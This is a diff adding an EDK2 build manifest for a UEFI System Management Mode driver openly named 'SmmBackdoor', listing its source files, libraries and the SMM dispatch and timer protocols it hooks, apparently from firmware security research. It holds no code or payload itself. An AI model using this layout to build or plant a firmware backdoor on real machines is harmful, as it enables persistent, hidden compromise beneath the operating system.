@@ -1,0 +1,44 @@
+[defines]
+  INF_VERSION = 0x00010005 
+  BASE_NAME = SmmBackdoor
+  FILE_GUID = 22D5AE41-147E-4C44-AE72-ECD9BBB455C1
+  MODULE_TYPE = DXE_SMM_DRIVER
+  ENTRY_POINT = BackdoorEntry
+
+[Sources]
+  debug.c
+  loader.c
+  printf.c
+  SmmBackdoor.c
+  serial.c
+
+[Sources.X64]
+  asm/amd64/common_asm.asm
+
+[Packages]
+  MdePkg/MdePkg.dec
+  MdeModulePkg/MdeModulePkg.dec
+  IntelFrameworkPkg/IntelFrameworkPkg.dec  
+  IntelFrameworkModulePkg/IntelFrameworkModulePkg.dec  
+  StdLib/StdLib.dec
+
+[LibraryClasses]
+  UefiDriverEntryPoint
+  UefiBootServicesTableLib
+  DebugLib
+  DevicePathLib
+  SynchronizationLib
+
+[Protocols]
+  gEfiSimpleTextOutProtocolGuid
+  gEfiLoadedImageProtocolGuid
+  gEfiSmmCpuProtocolGuid
+  gEfiSmmBase2ProtocolGuid
+  gEfiSmmAccess2ProtocolGuid
+  gEfiSmmSwDispatch2ProtocolGuid
+  gEfiSmmPeriodicTimerDispatch2ProtocolGuid
+  gEfiDevicePathProtocolGuid
+  gEfiSerialIoProtocolGuid  
+  
+[Depex]
+  TRUE
